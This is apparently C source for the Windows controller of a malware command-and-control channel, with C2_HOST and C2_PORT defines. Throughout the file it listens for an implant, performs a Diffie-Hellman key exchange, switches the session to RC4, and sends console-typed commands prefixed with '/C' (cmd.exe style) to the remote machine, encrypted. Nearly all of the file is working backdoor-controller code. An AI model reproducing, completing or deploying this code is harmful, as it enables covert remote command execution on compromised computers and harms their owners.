#include <WinSock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <Wincrypt.h>
#define DHKEYSIZE 512

#define C2_HOST "127.0.0.1"
#define C2_PORT 8080

static const BYTE g_P[] = {
  0xed, 0xa1, 0x53, 0x9b, 0xd8, 0x26, 0x05, 0x03,
  0x3a, 0x88, 0x52, 0x29, 0xf8, 0x77, 0x54, 0xcf,
  0x1d, 0xab, 0x60, 0x3a, 0xb9, 0xb0, 0x1f, 0xe3,
  0xa3, 0x69, 0x4e, 0x84, 0xb6, 0x2f, 0x02, 0x20,
  0x1f, 0xe1, 0x6e, 0x25, 0xcd, 0xbb, 0x74, 0x56,
  0x32, 0x05, 0x02, 0x6a, 0x8f, 0x7b, 0x9a, 0x89,
  0x80, 0x52, 0x71, 0xee, 0xf8, 0xa6, 0x4b, 0x91,
  0xb1, 0x35, 0x03, 0x76, 0xc1, 0xce, 0x21, 0xcf
};

static const BYTE g_G[] = {
  0x14, 0xcf, 0x6b, 0x2f, 0xca, 0xe9, 0x51, 0xa6,
  0xfd, 0x4d, 0xab, 0xea, 0x92, 0x29, 0xbb, 0xb8,
  0x3f, 0xb4, 0x56, 0x54, 0x1b, 0x8e, 0x7c, 0xe7,
  0x1e, 0x68, 0x50, 0x02, 0x4b, 0x44, 0x7b, 0xa3,
  0x13, 0xc8, 0x83, 0x69, 0xc0, 0x1a, 0xde, 0x06,
  0x11, 0x6d, 0x0d, 0xab, 0x93, 0x0f, 0xae, 0xfb,
  0x96, 0x17, 0x77, 0x86, 0x9b, 0x7d, 0xcd, 0x72,
  0xce, 0x1f, 0x80, 0x36, 0x49, 0x06, 0x79, 0x7c
};

int main() {
  HANDLE hHeap;
  DATA_BLOB P, G;
  PBYTE pbKeyBlob, pbTargetKeyBlob;
  HCRYPTPROV hCryptProv;
  HCRYPTKEY  hCryptKey, hSessionKey;

  P.cbData = DHKEYSIZE / 8;
  P.pbData = (BYTE*)(g_P);
  G.cbData = DHKEYSIZE / 8;
  G.pbData = (BYTE*)(g_G);

  if (!(hHeap = GetProcessHeap()))
    return 1;

  /* Create DH container */
  if (!CryptAcquireContext(&hCryptProv, NULL,
                           MS_ENH_DSS_DH_PROV,
                           PROV_DSS_DH,
                           CRYPT_VERIFYCONTEXT))
    return 1;

  /* Create a new key */
  if (!CryptGenKey(hCryptProv,
                   CALG_DH_EPHEM,
                   DHKEYSIZE << 16 | CRYPT_EXPORTABLE | CRYPT_PREGEN,
                   &hCryptKey))
    goto err_keygen;

  /* Set P and G, generate X */
  if (!CryptSetKeyParam(hCryptKey, KP_P, (PBYTE)&P, 0))
    goto err_keygen;
  if (!CryptSetKeyParam(hCryptKey, KP_G, (PBYTE)&G, 0))
    goto err_keygen;
  if (!CryptSetKeyParam(hCryptKey, KP_X, NULL, 0))
    goto err_keygen;

  /* Retrieve public key */
  DWORD dwDataLen;
  if (!CryptExportKey(hCryptKey, 0, PUBLICKEYBLOB, 0, NULL, &dwDataLen))
    goto err_getsz;
  if (!(pbKeyBlob = HeapAlloc(hHeap, 0, dwDataLen)))
    goto err_getsz;
  if (!CryptExportKey(hCryptKey, 0, PUBLICKEYBLOB, 0, pbKeyBlob, &dwDataLen))
    goto err_expkey;

  /* Setup server */
  WSADATA wsaData;
  WSAStartup(MAKEWORD(2, 0), &wsaData);

  SOCKET sock0 = socket(AF_INET, SOCK_STREAM, 0);
  SOCKADDR_IN sockaddr, client;
  sockaddr.sin_family = AF_INET;
  sockaddr.sin_port = htons((USHORT)C2_PORT);
  sockaddr.sin_addr.S_un.S_addr = INADDR_ANY;

  bind(sock0, (LPSOCKADDR)&sockaddr, sizeof(sockaddr));
  listen(sock0, 4);

  SOCKET sock;
  DWORD dwTargetDataLen;

  /* Receive key */
  int len = sizeof(client);
  sock = accept(sock0, (LPSOCKADDR)&client, &len);
  recv(sock, (void*)&dwTargetDataLen, sizeof(dwTargetDataLen), 0);
  if (!(pbTargetKeyBlob = HeapAlloc(hHeap, 0, dwTargetDataLen)))
    goto err_alloc;
  recv(sock, pbTargetKeyBlob, dwTargetDataLen, 0);

  if (!CryptImportKey(hCryptProv, pbTargetKeyBlob, dwTargetDataLen,
                      hCryptKey, 0, &hSessionKey))
    goto err_import;

  /* Send key */
  send(sock, (void*)&dwDataLen, sizeof(dwDataLen), 0);
  send(sock, pbKeyBlob, dwDataLen, 0);

  /* Now key is shared */
  ALG_ID algid = CALG_RC4;
  if (!CryptSetKeyParam(hSessionKey, KP_ALGID, (PBYTE)&algid, 0))
    goto err_import;

  HANDLE stdin = GetStdHandle(STD_INPUT_HANDLE);
  HANDLE stdout = GetStdHandle(STD_OUTPUT_HANDLE);
  while (1) {
    char cmd[0x100] = "/C ";
    PBYTE pbData;
    DWORD dwLength;

    WriteConsole(stdout, "> ", 2, &dwLength, NULL);
    ReadConsole(stdin, cmd + 3, 0x100 - 4, &dwLength, NULL);

    /* Encrypt command */
    dwLength = strlen(cmd) + 1;
    if (!CryptEncrypt(hSessionKey, 0, TRUE, 0, NULL, &dwLength, dwLength))
      break;

    if (!(pbData = HeapAlloc(hHeap, 0, dwLength)))
      break;
    CopyMemory(pbData, cmd, dwLength);

    if (!CryptEncrypt(hSessionKey, 0, TRUE, 0, pbData, &dwLength, dwLength)) {
      HeapFree(hHeap, 0, pbData);
      break;
    }

    send(sock, (void*)&dwLength, sizeof(dwLength), 0);
    send(sock, pbData, dwLength, 0);

    HeapFree(hHeap, 0, pbData);
  }

 err_import:
  HeapFree(hHeap, 0, pbTargetKeyBlob);
 err_alloc:
  closesocket(sock);
  WSACleanup();
 err_expkey:
  HeapFree(hHeap, 0, pbKeyBlob);
 err_getsz:
  CryptDestroyKey(hCryptKey);
 err_keygen:
  CryptReleaseContext(hCryptProv, 0);

  return 0;
}
